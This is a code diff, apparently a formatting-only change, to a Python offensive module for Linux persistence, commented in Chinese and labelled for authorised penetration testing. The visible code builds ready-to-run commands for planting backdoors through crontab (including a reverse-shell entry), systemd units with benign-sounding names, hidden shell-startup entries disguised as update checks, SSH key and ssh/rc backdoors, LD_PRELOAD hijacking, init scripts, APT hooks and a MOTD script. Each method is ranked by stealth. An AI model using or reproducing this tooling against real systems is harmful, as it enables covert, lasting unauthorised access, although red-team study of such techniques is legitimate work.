@@ -5,21 +5,22 @@ Linux 持久化模块 - Linux Persistence
 仅用于授权渗透测试
 """
 
-import os
 import base64
+import logging
+import os
 import secrets
 import string
-import logging
-from pathlib import Path
-from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 from enum import Enum
+from pathlib import Path
+from typing import Any, Dict, List, Optional
 
 logger = logging.getLogger(__name__)
 
 
 class LinuxPersistMethod(Enum):
     """Linux 持久化方法"""
+
     CRONTAB = "crontab"
     SYSTEMD_SERVICE = "systemd_service"
     SYSTEMD_TIMER = "systemd_timer"
@@ -38,6 +39,7 @@ class LinuxPersistMethod(Enum):
 @dataclass
 class PersistenceResult:
     """持久化结果"""
+
     success: bool
     method: str
     location: str
@@ -68,7 +70,7 @@ class LinuxPersistence:
     """
 
     def __init__(self):
-        self._random_suffix = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))
+        self._random_suffix = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))
 
     def _generate_name(self, prefix: str = "sys") -> str:
         """生成随机名称"""
@@ -76,11 +78,9 @@ class LinuxPersistence:
 
     # ==================== Crontab ====================
 
-    def crontab(self,
-                command: str,
-                schedule: str = "@reboot",
-                user: str = "",
-                hidden: bool = True) -> PersistenceResult:
+    def crontab(
+        self, command: str, schedule: str = "@reboot", user: str = "", hidden: bool = True
+    ) -> PersistenceResult:
         """
         Crontab 持久化
 
@@ -97,7 +97,7 @@ class LinuxPersistence:
 
         if user:
             install_cmd = f'echo "{cron_entry}" | sudo crontab -u {user} -'
-            cleanup_cmd = f'sudo crontab -u {user} -r'
+            cleanup_cmd = f"sudo crontab -u {user} -r"
         else:
             install_cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
             cleanup_cmd = f'crontab -l | grep -v "{command}" | crontab -'
@@ -108,13 +108,12 @@ class LinuxPersistence:
             location=f"/var/spool/cron/crontabs/{user or '$USER'}",
             install_command=install_cmd,
             cleanup_command=cleanup_cmd,
-            content=cron_entry
+            content=cron_entry,
         )
 
-    def crontab_reverse_shell(self,
-                               lhost: str,
-                               lport: int,
-                               schedule: str = "*/5 * * * *") -> PersistenceResult:
+    def crontab_reverse_shell(
+        self, lhost: str, lport: int, schedule: str = "*/5 * * * *"
+    ) -> PersistenceResult:
         """
         Crontab 反弹 Shell
 
@@ -129,12 +128,14 @@ class LinuxPersistence:
 
     # ==================== Systemd ====================
 
-    def systemd_service(self,
-                        exec_path: str,
-                        name: str = "",
-                        description: str = "System Health Monitor",
-                        restart: str = "always",
-                        user: str = "root") -> PersistenceResult:
+    def systemd_service(
+        self,
+        exec_path: str,
+        name: str = "",
+        description: str = "System Health Monitor",
+        restart: str = "always",
+        user: str = "root",
+    ) -> PersistenceResult:
         """
         Systemd 服务持久化
 
@@ -148,7 +149,7 @@ class LinuxPersistence:
         name = name or self._generate_name("svc")
         service_file = f"/etc/systemd/system/{name}.service"
 
-        service_content = f'''[Unit]
+        service_content = f"""[Unit]
 Description={description}
 After=network.target
 
@@ -161,19 +162,19 @@ User={user}
 
 [Install]
 WantedBy=multi-user.target
-'''
+"""
 
-        install_cmd = f'''cat > {service_file} << 'EOF'
+        install_cmd = f"""cat > {service_file} << 'EOF'
 {service_content}
 EOF
 systemctl daemon-reload
 systemctl enable {name}
-systemctl start {name}'''
+systemctl start {name}"""
 
-        cleanup_cmd = f'''systemctl stop {name}
+        cleanup_cmd = f"""systemctl stop {name}
 systemctl disable {name}
 rm -f {service_file}
-systemctl daemon-reload'''
+systemctl daemon-reload"""
 
         return PersistenceResult(
             success=True,
@@ -181,14 +182,12 @@ systemctl daemon-reload'''
             location=service_file,
             install_command=install_cmd,
             cleanup_command=cleanup_cmd,
-            content=service_content
+            content=service_content,
         )
 
-    def systemd_timer(self,
-                      exec_path: str,
-                      name: str = "",
-                      on_boot_sec: int = 60,
-                      on_unit_active_sec: int = 300) -> Dict[str, str]:
+    def systemd_timer(
+        self, exec_path: str, name: str = "", on_boot_sec: int = 60, on_unit_active_sec: int = 300
+    ) -> Dict[str, str]:
         """
         Systemd Timer 持久化 (更隐蔽)
 
@@ -200,15 +199,15 @@ systemctl daemon-reload'''
         """
         name = name or self._generate_name("timer")
 
-        service_content = f'''[Unit]
+        service_content = f"""[Unit]
 Description=System Maintenance Service
 
 [Service]
 Type=oneshot
 ExecStart={exec_path}
-'''
+"""
 
-        timer_content = f'''[Unit]
+        timer_content = f"""[Unit]
 Description=System Maintenance Timer
 
 [Timer]
@@ -217,7 +216,7 @@ OnUnitActiveSec={on_unit_active_sec}
 
 [Install]
 WantedBy=timers.target
-'''
+"""
 
         return {
             "service_file": f"/etc/systemd/system/{name}.service",
@@ -225,15 +224,12 @@ WantedBy=timers.target
             "timer_file": f"/etc/systemd/system/{name}.timer",
             "timer_content": timer_content,
             "install_command": f"systemctl daemon-reload && systemctl enable {name}.timer && systemctl start {name}.timer",
-            "cleanup_command": f"systemctl stop {name}.timer && systemctl disable {name}.timer && rm -f /etc/systemd/system/{name}.service /etc/systemd/system/{name}.timer"
+            "cleanup_command": f"systemctl stop {name}.timer && systemctl disable {name}.timer && rm -f /etc/systemd/system/{name}.service /etc/systemd/system/{name}.timer",
         }
 
     # ==================== Shell RC ====================
 
-    def bashrc(self,
-               command: str,
-               user: str = "",
-               hidden: bool = True) -> PersistenceResult:
+    def bashrc(self, command: str, user: str = "", hidden: bool = True) -> PersistenceResult:
         """
         .bashrc 持久化
 
@@ -248,9 +244,9 @@ WantedBy=timers.target
             bashrc_path = "~/.bashrc"
 
         if hidden:
-            entry = f'\n# System update check\n({command}) >/dev/null 2>&1 &\n'
+            entry = f"\n# System update check\n({command}) >/dev/null 2>&1 &\n"
         else:
-            entry = f'\n{command}\n'
+            entry = f"\n{command}\n"
 
         install_cmd = f'echo "{entry}" >> {bashrc_path}'
         cleanup_cmd = f'sed -i "/{command.replace("/", "\\/")}/d" {bashrc_path}'
@@ -261,7 +257,7 @@ WantedBy=timers.target
             location=bashrc_path,
             install_command=install_cmd,
             cleanup_command=cleanup_cmd,
-            content=entry
+            content=entry,
         )
 
     def profile(self, command: str, hidden: bool = True) -> PersistenceResult:
@@ -271,9 +267,9 @@ WantedBy=timers.target
         profile_path = "/etc/profile"
 
         if hidden:
-            entry = f'\n# System initialization\n({command}) >/dev/null 2>&1 &\n'
+            entry = f"\n# System initialization\n({command}) >/dev/null 2>&1 &\n"
         else:
-            entry = f'\n{command}\n'
+            entry = f"\n{command}\n"
 
         return PersistenceResult(
             success=True,
@@ -281,15 +277,14 @@ WantedBy=timers.target
             location=profile_path,
             install_command=f'echo "{entry}" >> {profile_path}',
             cleanup_command=f'sed -i "/{command.replace("/", "\\/")}/d" {profile_path}',
-            content=entry
+            content=entry,
         )
 
     # ==================== SSH ====================
 
-    def ssh_authorized_keys(self,
-                            public_key: str,
-                            user: str = "root",
-                            options: str = "") -> PersistenceResult:
+    def ssh_authorized_keys(
+        self, public_key: str, user: str = "root", options: str = ""
+    ) -> PersistenceResult:
         """
         SSH authorized_keys 持久化
 
@@ -304,14 +299,14 @@ WantedBy=timers.target
             auth_keys_path = f"/home/{user}/.ssh/authorized_keys"
 
         if options:
-            entry = f'{options} {public_key}'
+            entry = f"{options} {public_key}"
         else:
             entry = public_key
 
-        install_cmd = f'''mkdir -p $(dirname {auth_keys_path})
+        install_cmd = f"""mkdir -p $(dirname {auth_keys_path})
 chmod 700 $(dirname {auth_keys_path})
 echo "{entry}" >> {auth_keys_path}
-chmod 600 {auth_keys_path}'''
+chmod 600 {auth_keys_path}"""
 
         return PersistenceResult(
             success=True,
@@ -319,13 +314,12 @@ chmod 600 {auth_keys_path}'''
             location=auth_keys_path,
             install_command=install_cmd,
             cleanup_command=f'sed -i "/{public_key[:30].replace("/", "\\/")}/d" {auth_keys_path}',
-            content=entry
+            content=entry,
         )
 
-    def ssh_authorized_keys_backdoor(self,
-                                      public_key: str,
-                                      backdoor_command: str,
-                                      user: str = "root") -> PersistenceResult:
+    def ssh_authorized_keys_backdoor(
+        self, public_key: str, backdoor_command: str, user: str = "root"
+    ) -> PersistenceResult:
         """
         SSH authorized_keys 后门 (登录时执行命令)
 
@@ -347,29 +341,27 @@ chmod 600 {auth_keys_path}'''
         else:
             rc_path = "~/.ssh/rc"
 
-        content = f'''#!/bin/bash
+        content = f"""#!/bin/bash
 {command} &
-'''
+"""
 
-        install_cmd = f'''cat > {rc_path} << 'EOF'
+        install_cmd = f"""cat > {rc_path} << 'EOF'
 {content}
 EOF
-chmod 700 {rc_path}'''
+chmod 700 {rc_path}"""
 
         return PersistenceResult(
             success=True,
             method=LinuxPersistMethod.SSH_RC.value,
             location=rc_path,
             install_command=install_cmd,
-            cleanup_command=f'rm -f {rc_path}',
-            content=content
+            cleanup_command=f"rm -f {rc_path}",
+            content=content,
         )
 
     # ==================== LD_PRELOAD ====================
 
-    def ld_preload(self,
-                   so_path: str,
-                   global_config: bool = True) -> PersistenceResult:
+    def ld_preload(self, so_path: str, global_config: bool = True) -> PersistenceResult:
         """
         LD_PRELOAD 持久化 (共享库劫持)
 
@@ -391,7 +383,7 @@ chmod 700 {rc_path}'''
             method=LinuxPersistMethod.LD_PRELOAD.value,
             location=location,
             install_command=install_cmd,
-            cleanup_command=cleanup_cmd
+            cleanup_command=cleanup_cmd,
         )
 
     def generate_preload_so(self, command: str) -> str:
@@ -401,7 +393,7 @@ chmod 700 {rc_path}'''
         Args:
             command: 要执行的命令
         """
-        c_code = f'''#include <stdio.h>
+        c_code = f"""#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
@@ -414,21 +406,19 @@ void preload_init(void) {{
         exit(0);
     }}
 }}
-'''
+"""
         return c_code
 
     # ==================== Init Scripts ====================
 
-    def init_d(self,
-               exec_path: str,
-               name: str = "") -> PersistenceResult:
+    def init_d(self, exec_path: str, name: str = "") -> PersistenceResult:
         """
         /etc/init.d/ 持久化 (SysV init)
         """
         name = name or self._generate_name("init")
         init_path = f"/etc/init.d/{name}"
 
-        script_content = f'''#!/bin/bash
+        script_content = f"""#!/bin/bash
 ### BEGIN INIT INFO
 # Provides:          {name}
 # Required-Start:    $local_fs $network
@@ -451,21 +441,21 @@ case "$1" in
         ;;
 esac
 exit 0
-'''
+"""
 
-        install_cmd = f'''cat > {init_path} << 'INITEOF'
+        install_cmd = f"""cat > {init_path} << 'INITEOF'
 {script_content}
 INITEOF
 chmod +x {init_path}
-update-rc.d {name} defaults'''
+update-rc.d {name} defaults"""
 
         return PersistenceResult(
             success=True,
             method=LinuxPersistMethod.INIT_D.value,
             location=init_path,
             install_command=install_cmd,
-            cleanup_command=f'update-rc.d -f {name} remove && rm -f {init_path}',
-            content=script_content
+            cleanup_command=f"update-rc.d -f {name} remove && rm -f {init_path}",
+            content=script_content,
         )
 
     def rc_local(self, command: str) -> PersistenceResult:
@@ -474,27 +464,25 @@ update-rc.d {name} defaults'''
         """
         rc_local_path = "/etc/rc.local"
 
-        install_cmd = f'''if [ ! -f {rc_local_path} ]; then
+        install_cmd = f"""if [ ! -f {rc_local_path} ]; then
     echo '#!/bin/bash' > {rc_local_path}
     chmod +x {rc_local_path}
 fi
 sed -i '/^exit 0/d' {rc_local_path}
 echo '{command}' >> {rc_local_path}
-echo 'exit 0' >> {rc_local_path}'''
+echo 'exit 0' >> {rc_local_path}"""
 
         return PersistenceResult(
             success=True,
             method=LinuxPersistMethod.RC_LOCAL.value,
             location=rc_local_path,
             install_command=install_cmd,
-            cleanup_command=f'sed -i "/{command.replace("/", "\\/")}/d" {rc_local_path}'
+            cleanup_command=f'sed -i "/{command.replace("/", "\\/")}/d" {rc_local_path}',
         )
 
     # ==================== APT Hook ====================
 
-    def apt_hook(self,
-                 command: str,
-                 name: str = "") -> PersistenceResult:
+    def apt_hook(self, command: str, name: str = "") -> PersistenceResult:
         """
         APT Hook 持久化 (apt 操作时执行)
         """
@@ -507,9 +495,9 @@ echo 'exit 0' >> {rc_local_path}'''
             success=True,
             method=LinuxPersistMethod.APT_HOOK.value,
             location=hook_path,
-            install_command=f'echo \'{content}\' > {hook_path}',
-            cleanup_command=f'rm -f {hook_path}',
-            content=content
+            install_command=f"echo '{content}' > {hook_path}",
+            cleanup_command=f"rm -f {hook_path}",
+            content=content,
         )
 
     # ==================== MOTD ====================
@@ -520,20 +508,20 @@ echo 'exit 0' >> {rc_local_path}'''
         """
         motd_path = "/etc/update-motd.d/99-backdoor"
 
-        content = f'''#!/bin/bash
+        content = f"""#!/bin/bash
 {command} >/dev/null 2>&1 &
-'''
+"""
 
         return PersistenceResult(
             success=True,
             method=LinuxPersistMethod.MOTD.value,
             location=motd_path,
-            install_command=f'''cat > {motd_path} << 'EOF'
+            install_command=f"""cat > {motd_path} << 'EOF'
 {content}
 EOF
-chmod +x {motd_path}''',
-            cleanup_command=f'rm -f {motd_path}',
-            content=content
+chmod +x {motd_path}""",
+            cleanup_command=f"rm -f {motd_path}",
+            content=content,
         )
 
     # ==================== 综合方法 ====================
@@ -546,55 +534,61 @@ chmod +x {motd_path}''',
 
         # Crontab
         result = self.crontab(command)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "install": result.install_command,
-            "cleanup": result.cleanup_command,
-            "requires_root": False,
-            "stealth": "medium"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "install": result.install_command,
+                "cleanup": result.cleanup_command,
+                "requires_root": False,
+                "stealth": "medium",
+            }
+        )
 
         # Systemd
         result = self.systemd_service(command)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "install": result.install_command,
-            "cleanup": result.cleanup_command,
-            "requires_root": True,
-            "stealth": "low"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "install": result.install_command,
+                "cleanup": result.cleanup_command,
+                "requires_root": True,
+                "stealth": "low",
+            }
+        )
 
         # Bashrc
         result = self.bashrc(command)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "install": result.install_command,
-            "cleanup": result.cleanup_command,
-            "requires_root": False,
-            "stealth": "low"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "install": result.install_command,
+                "cleanup": result.cleanup_command,
+                "requires_root": False,
+                "stealth": "low",
+            }
+        )
 
         # RC Local
         result = self.rc_local(command)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "install": result.install_command,
-            "cleanup": result.cleanup_command,
-            "requires_root": True,
-            "stealth": "medium"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "install": result.install_command,
+                "cleanup": result.cleanup_command,
+                "requires_root": True,
+                "stealth": "medium",
+            }
+        )
 
         return methods
 
 
 # 便捷函数
-def linux_persist(command: str,
-                  method: str = "crontab",
-                  **kwargs) -> Dict[str, Any]:
+def linux_persist(command: str, method: str = "crontab", **kwargs) -> Dict[str, Any]:
     """
     Linux 持久化便捷函数
 
@@ -632,7 +626,7 @@ def linux_persist(command: str,
             "install_command": result.install_command,
             "cleanup_command": result.cleanup_command,
             "content": result.content,
-            "error": result.error
+            "error": result.error,
         }
 
     return {"success": False, "error": f"Unknown method: {method}"}
@@ -641,16 +635,66 @@ def linux_persist(command: str,
 def list_linux_persistence_methods() -> List[Dict[str, str]]:
     """列出所有可用的 Linux 持久化方法"""
     return [
-        {"method": "crontab", "description": "Crontab 定时任务", "root_required": False, "stealth": "medium"},
-        {"method": "systemd", "description": "Systemd 服务", "root_required": True, "stealth": "low"},
-        {"method": "systemd_timer", "description": "Systemd 定时器", "root_required": True, "stealth": "medium"},
-        {"method": "bashrc", "description": ".bashrc 启动脚本", "root_required": False, "stealth": "low"},
-        {"method": "profile", "description": "/etc/profile 全局脚本", "root_required": True, "stealth": "medium"},
-        {"method": "ssh_keys", "description": "SSH authorized_keys", "root_required": False, "stealth": "high"},
-        {"method": "ssh_rc", "description": "SSH RC 脚本", "root_required": False, "stealth": "high"},
-        {"method": "ld_preload", "description": "LD_PRELOAD 劫持", "root_required": True, "stealth": "high"},
-        {"method": "init_d", "description": "/etc/init.d 脚本", "root_required": True, "stealth": "low"},
-        {"method": "rc_local", "description": "/etc/rc.local", "root_required": True, "stealth": "medium"},
+        {
+            "method": "crontab",
+            "description": "Crontab 定时任务",
+            "root_required": False,
+            "stealth": "medium",
+        },
+        {
+            "method": "systemd",
+            "description": "Systemd 服务",
+            "root_required": True,
+            "stealth": "low",
+        },
+        {
+            "method": "systemd_timer",
+            "description": "Systemd 定时器",
+            "root_required": True,
+            "stealth": "medium",
+        },
+        {
+            "method": "bashrc",
+            "description": ".bashrc 启动脚本",
+            "root_required": False,
+            "stealth": "low",
+        },
+        {
+            "method": "profile",
+            "description": "/etc/profile 全局脚本",
+            "root_required": True,
+            "stealth": "medium",
+        },
+        {
+            "method": "ssh_keys",
+            "description": "SSH authorized_keys",
+            "root_required": False,
+            "stealth": "high",
+        },
+        {
+            "method": "ssh_rc",
+            "description": "SSH RC 脚本",
+            "root_required": False,
+            "stealth": "high",
+        },
+        {
+            "method": "ld_preload",
+            "description": "LD_PRELOAD 劫持",
+            "root_required": True,
+            "stealth": "high",
+        },
+        {
+            "method": "init_d",
+            "description": "/etc/init.d 脚本",
+            "root_required": True,
+            "stealth": "low",
+        },
+        {
+            "method": "rc_local",
+            "description": "/etc/rc.local",
+            "root_required": True,
+            "stealth": "medium",
+        },
         {"method": "apt_hook", "description": "APT Hook", "root_required": True, "stealth": "high"},
         {"method": "motd", "description": "MOTD 脚本", "root_required": True, "stealth": "medium"},
     ]
@@ -658,7 +702,7 @@ def list_linux_persistence_methods() -> List[Dict[str, str]]:
 
 if __name__ == "__main__":
     # 配置测试用日志
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
 
     logger.info("Linux Persistence Module")
     logger.info("=" * 50)
